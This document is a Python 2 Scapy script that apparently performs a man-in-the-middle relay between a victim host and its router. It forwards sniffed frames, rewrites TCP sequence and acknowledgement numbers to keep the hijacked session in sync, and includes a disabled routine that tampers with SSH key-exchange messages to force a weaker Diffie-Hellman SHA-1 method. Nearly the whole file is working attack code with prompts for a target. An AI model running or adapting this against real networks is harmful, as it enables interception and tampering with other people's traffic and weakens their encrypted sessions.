from scapy.all import *
import sys, os, time, binascii
from ssh import SSH

# Get MAC address from IP
def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")
	#endfor
#def

# Send packet; fragment if necessary
def send_pkt (packet):
	if len(packet) > 1500:
		frags = fragment(packet,fragsize=500)
		for frag in frags:
			s.send(frag)
		#endfor
	else:
		s.send(packet)
	#endif
#enddef

# Forward captured packet
def forward(packet):
	roleplay(packet)
	# check_payload(packet);
	myMAC = packet[Ether].dst
	packet[Ether].dst = EX.get(packet[Ether].src)
	packet[Ether].src = myMAC
	send_pkt(packet)
#enddef

# Modify payload
def set_payload(packet):
	pass
#enddef

# test
client = {
	"seq": None,
	"ack": None,
	"plen": None, # payload_len
	"expected_ack": None # expected ack number
}
server = {
	"seq": None,
	"ack": None,
	"plen": None, # payload_len
	"expected_ack": None # expected ack number
}

def roleplay(packet):
	# Make sure TCP sequence and ack numbers are correct
	if packet.haslayer(TCP):
		if EX.get(packet[Ether].src) == gateMAC:
			# packet from client
			# initialization
			if client["seq"] == None and packet[TCP].seq != 0:
				client["seq"] = packet[TCP].seq
				client["expected_ack"] = client["seq"] + 1
				return
			#endif
			client["seq"] = packet[TCP].seq
			client["ack"] = packet[TCP].ack
			client["plen"] = 0
			if packet.haslayer(Raw):
				client["plen"] = len(packet[Raw].load)
			#endif
			# expected ack
			client["expected_ack"] = client["seq"] + client["plen"]
			if server["expected_ack"] != None and server["expected_ack"] != client["ack"]:
				packet[TCP].ack = server["expected_ack"]
				print "client: assigned ack " + str(server["expected_ack"])
			#endif
			# expected seq from client to server
			if server["ack"] != None and client["seq"] != server["ack"]:
				packet[TCP].seq = server["ack"]
				print "client: assigned seq " + str(server["ack"])
			#endif
			print "From client:"
			print "SEQ: " + str(client["seq"])
			print "ACK: " + str(client["ack"])
			print "LEN: " + str(client["plen"])
			print " "
		elif EX.get(packet[Ether].src) == victimMAC:
			# packet from server
			# initialization
			if server["seq"] == None and packet[TCP].seq != 0:
				server["seq"] = packet[TCP].seq
				server["expected_ack"] = server["seq"] + 1
				return
			#endif
			server["seq"] = packet[TCP].seq
			server["ack"] = packet[TCP].ack
			server["plen"] = 0
			if packet.haslayer(Raw):
				server["plen"] = len(packet[Raw].load)
			#endif
			server["expected_ack"] = server["seq"] + server["plen"]
			if client["expected_ack"] != None and client["expected_ack"] != server["ack"]:
				packet[TCP].ack = client["expected_ack"]
				print "server: assigned ack " + str(client["expected_ack"])
			#endif
			# expected seq from server to client
			if client["ack"] != None and server["seq"] != client["ack"]:
				packet[TCP].seq = client["ack"]
				print "server: assigned seq " + str(client["ack"])
			#endif
			print "From server:"
			print "SEQ: " + str(server["seq"])
			print "ACK: " + str(server["ack"])
			print "LEN: " + str(server["plen"])
			print " "
		#endif
	#endif
#enddef

def check_payload(packet):
	if not packet.haslayer(TCP) or not packet.haslayer(Raw):
		return
	#endif
	if packet[TCP].dport != 22 and packet[TCP].sport != 22:
		return
	#endif
	try:
		if packet[TCP].sport == 22:
			ssh = SSH(packet[Raw].load)
			old_len = len(packet[Raw].load)
			if ord(ssh.SSH_MSG_KEXINIT) == int("14",16):
				ssh.kex_algorithms = "diffie-hellman-group-exchange-sha1"
				payload_new = ssh.reconstruct()
				packet[Raw].load = payload_new
				diff_len = old_len - len(payload_new)
				packet[IP].len = packet[IP].len - diff_len
				del packet[TCP].chksum
				del packet[IP].chksum
			#endif
		#endif
	except Exception as error:
		print repr(error)
	#endtry	
#enddef

if __name__ == '__main__':
	try:
		interface = raw_input("[*] Enter Desired Interface: ")
		victimIP = raw_input("[*] Enter Victim IP: ")
		gateIP = raw_input("[*] Enter Router IP: ")
	except KeyboardInterrupt:
		print "\n[*] User Requested Shutdown"
		print "[*] Exiting..."
		sys.exit(1)
	#endtry
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		print "[!] Sniffer: Couldn't Find Victim MAC Address"
		print "[!] Sniffer: Exiting..."
		sys.exit(1)
	#endtry

	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		print "[!] Sniffer: Couldn't Find Gateway MAC Address"
		print "[!] Sniffer: Exiting..."
		sys.exit(1)
	#endtry

	EX = {gateMAC: victimMAC, victimMAC: gateMAC}
	s = conf.L2socket(iface=interface)
	print "\n[*] Begin sniffing...\n"
	sniff(filter="ether src %s or ether src %s" % (victimMAC, gateMAC), prn=forward)